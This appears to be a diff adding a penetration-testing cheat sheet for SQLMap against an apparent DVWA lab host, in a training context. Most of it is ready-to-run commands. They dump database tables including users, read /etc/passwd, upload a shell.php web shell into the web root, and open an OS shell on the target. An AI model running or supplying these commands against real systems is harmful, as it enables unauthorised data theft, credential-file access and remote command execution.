@@ -1,0 +1,69 @@
+
+SQLMap is a popular open-source penetration testing tool that automates the testing and exploitation of SQL injection vulnerabilities.
+When SQLmap detects an SQL injection vulnerability in a provided parameter, SQLMap can automatically exploit it to fetch the database contents, access the underlying file system, interact with the local file system or even spawn an OS shell. 
+SQLMap supports a wide range of database management systems such as MySQL, PostgreSQL, Microsoft SQL Server, Oracle, and many more.
+
+• Verbosity level
+• Testing Authenticated Session ID 
+• Enumerating the Database 
+• Downloading and Uploading Files
+• SQLMap OS-Shell
+
+
+➜ Verbosity level
+
+The default setting when no verbosity level is specified is level 1
+
+0: Show only Python tracebacks, error and critical messages.
+1: Show also information and warning messages.
+2: Show also debug messages.
+3: Show also payloads injected.
+4: Show also HTTP requests.
+5: Show also HTTP responses’ headers.
+6: Show also HTTP responses’ page content.
+
+
+➜ Testing Authenticated Session ID
+
+sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --batch
+sqlmap -u " http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --banner
+
+
+➜ Enumerating the Database
+ 
+sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --dbs
+sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --tables
+sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --columns --current-db
+sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --dump --current-db -T users
+sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --dump -T users -v 0
+
+sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --dbs -v 3  #  which payloads is SQLMap using
+
+
+➜ Downloading and Uploading Files
+
+With the –file-read option, we can read and download files from the target host to our attack box. 
+With the –file-write and –file-dest options, we can upload files from the attack box to the target host. 
+
+sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --file-read=/etc/passwd
+sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --file-write="/tmp/shell.php" --file-dest="/var/www/shell.php"
+
+
+➜ SQLMap OS-Shell
+
+We can also use the built-in os-shell function to execute system commands. SQLMap returns a shell (indicated by the os-shell>) to run commands on the underlying system. 
+
+sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --os-shell
+
+
+
+https://sqlmap.org/
+https://github.com/sqlmapproject/sqlmap/wiki/Usage
+
+*
+
+
+
+
+
+
